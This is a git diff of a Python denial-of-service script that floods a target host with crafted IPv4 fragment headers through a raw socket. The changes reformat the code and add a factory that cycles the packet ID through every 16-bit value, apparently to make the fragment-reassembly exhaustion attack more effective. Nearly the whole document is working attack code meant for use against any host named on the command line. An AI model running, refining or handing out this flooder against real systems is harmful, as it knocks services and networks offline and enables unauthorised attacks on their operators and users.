@@ -2,28 +2,28 @@
 
 import argparse
 import socket
-import sys
 import struct
+import sys
 
 
 def mk_parser():
     parser = argparse.ArgumentParser(
-        description='Floods the target host with the start of IPv4 fragments')
-    parser.add_argument('host', help='The host to send packets to')
+        description="Floods the target host with the start of IPv4 fragments"
+    )
+    parser.add_argument("host", help="The host to send packets to")
     return parser
 
 
 def mk_sock():
     try:
-        sock = socket.socket(
-            socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         return sock
     except socket.error as e:
         print(f"Could not create socket: {e}")
         sys.exit(1)
 
 
-def mk_header(src_ip, dst_ip):
+def mk_header_factory(src_ip, dst_ip):
     # Header Length = 5 bytes (no extra options)
     ihl = 5
     # IPv4
@@ -33,13 +33,10 @@ def mk_header(src_ip, dst_ip):
     tos = 0
     # Handled by OS
     tot_len = 0
-    # Unique packet ID
-    # TODO: does it help to randomize this? or is that extra computational burden
-    ident = 12345
     # Flags | Offset
     # > Sets the "more fragments" bit
     # > And displays this as the very last fragment
-    frag_off = int('0b0011111111111111', base=2)
+    frag_off = int("0b0011111111111111", base=2)
     ttl = 255
     proto = socket.IPPROTO_TCP
     # Handled by OS
@@ -50,26 +47,44 @@ def mk_header(src_ip, dst_ip):
     # Make this a byte
     ihl_ver = (ver << 4) | ihl
 
-    return struct.pack(
-        '!BBHHHBBH4s4s',
-        ihl_ver, tos, tot_len, ident, frag_off, ttl, proto, check, src, dst)
+    def factory(packet_id: int):
+        # Accepts a variable packet ID
+        return struct.pack(
+            "!BBHHHBBH4s4s",
+            ihl_ver,
+            tos,
+            tot_len,
+            packet_id,
+            frag_off,
+            ttl,
+            proto,
+            check,
+            src,
+            dst,
+        )
+
+    return factory
+
+
+MAX_PACKET_ID = 65536
 
 
 def main():
     args = mk_parser().parse_args()
     target = args.host
-    src = '10.0.0.211'
-    header = mk_header(src, target)
+    src = "10.0.0.211"
+    header_factory = mk_header_factory(src, target)
     sock = mk_sock()
     counter = 0
     try:
         while True:
+            header = header_factory(counter % MAX_PACKET_ID)
             sock.sendto(header, (target, 0))
             counter += 1
     except KeyboardInterrupt:
-        print(f"Sent {counter} packets to {target}!")
+        print(f"\nSent {counter:,} packets to {target}!")
         sys.exit(0)
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
